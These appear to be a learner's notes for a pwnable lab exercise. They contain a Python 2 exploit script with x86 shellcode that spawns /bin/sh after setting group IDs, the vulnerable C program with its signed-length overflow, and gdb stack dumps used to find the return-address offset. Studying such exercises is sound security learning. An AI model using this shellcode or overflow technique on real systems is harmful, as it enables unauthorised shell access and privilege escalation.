pwnable:~$ cat egg
#!/usr/bin/env python2
eip = "\x30\xfb\xff\xbf"
size = "\xff"

shellcode = \
"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
"\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
"\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

#editing #bytes_read = fread(msg, 1, size, file)
print(size + "A"*(148) + eip + shellcode)

////////////////////////////////
#telemetry.c
pwnable:~$ cat telemetry.c
#include <stdint.h>
#include <stdio.h>
#include <string.h>

void display(const char *path)
{
  char msg[128];
  int8_t size;
  memset(msg, 0, 128);

  FILE *file = fopen(path, "r");
  if (!file) {
    perror("fopen");
    return;
  }
  size_t bytes_read = fread(&size, 1, 1, file);
  if (bytes_read == 0 || size > 128)
    return;
  bytes_read = fread(msg, 1, size, file);

  puts(msg);
}


int main(int argc, char *argv[])
{
  if (argc != 2)
    return 1;

  display(argv[1]);
  return 0;
}



0x1310 <display+110>    call   0x1050 <fread@plt>
│   0x1315 <display+115>    add    $0x10,%esp
│   0x1318 <display+118>    mov    %eax,-0x10(%ebp)
│   0x131b <display+121>    cmpl   $0x0,-0x10(%ebp)

Stack level 0, frame at 0xbffffb30:
 eip = 0x401302 in display (telemetry.c:16); saved eip = 0x401397
 called by frame at 0xbffffb60
 source language c.
 Arglist at 0xbffffb28, args: path=0xbffffcdc "navigation"
 Locals at 0xbffffb28, Previous frame's sp is 0xbffffb30
 Saved registers:
  ebx at 0xbffffb24, ebp at 0xbffffb28, eip at 0xbffffb2c



#------------------------------------------------------------------------
SFP is Saved EBP
RIP is Saved EIP
#bytes_read = fread(msg, 1, size, file);
msg -- 128 bytes
1 - 1 bytes
size - "\xff"
file - shellcode
#---------------------------DISPLAY[19]----------------------------------
0x1338 <display+150>    call   0x1050 <fread@plt>call 2nd call to fread formatted: the first byte of the file specifies its length, followed by the actual file.│
│   0x133d <display+155>    add    $0x10,%esp                                                                         │
│   0x1340 <display+158>    mov    %eax,-0x10(%ebp)                                                                   │
│   0x1343 <display+161>    sub    $0xc,%esp                                                                          │
│   0x1346 <display+164>    lea    -0x90(%ebp),%eax                                                                   │
│   0x134c <display+170>    push   %eax
#(gdb)b 19
#Breakpoint 1, display (path=0xbffffcdc "navigation") at telemetry.c:19
#(gdb) i f
#Stack level 0, frame at 0xbffffb30:
# eip = 0x401321 in display (telemetry.c:19); saved eip = 0x401397
# called by frame at 0xbffffb60
# source language c.
# Arglist at 0xbffffb28, args: path=0xbffffcdc "navigation"
# Locals at 0xbffffb28, Previous frame's sp is 0xbffffb30
# Saved registers:
#  ebx at 0xbffffb24, ebp at 0xbffffb28, eip at 0xbffffb2c
#
#  VALUE OF EIP/RIP = @ 0x401397
#  LOC OF EIP/RIP = @ 0xbffffb2c
#  LOC OF EBP/SFP = @ 0xbffffb28

#  DISTANCE FROM RIP-SFP == 4
#
#         -----------(gdb) x/32x 0xbffffb30-----------(128 bytes)
#         0xbffffb30:     0xbffffcdc      0x00000000      0x00000000      0x00401373
#         0xbffffb40:     0x00000000      0xbffffb60      0xbffffbe0      0xb7f82ef2
#         0xbffffb50:     0xbffffbd4      0x00000002      0x00000000      0xb7f82ef2
#         0xbffffb60:     0x00000002      0xbffffbd4      0xbffffbe0      0xb7fff090
#         0xbffffb70:     0x00000011      0x00000000      0xb7f82ed0      0x00403fbc
#         0xbffffb80:     0xb7ffea20      0xb7ffec40      0x0000000       0x004010fd
#         0xbffffb90:     0x0040135d      0x00000002      0xbffffbd4      0x00401000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#         0xbffffba0:     0x004013f1      0x00000000      0xb7fc675b      0x00000000
#
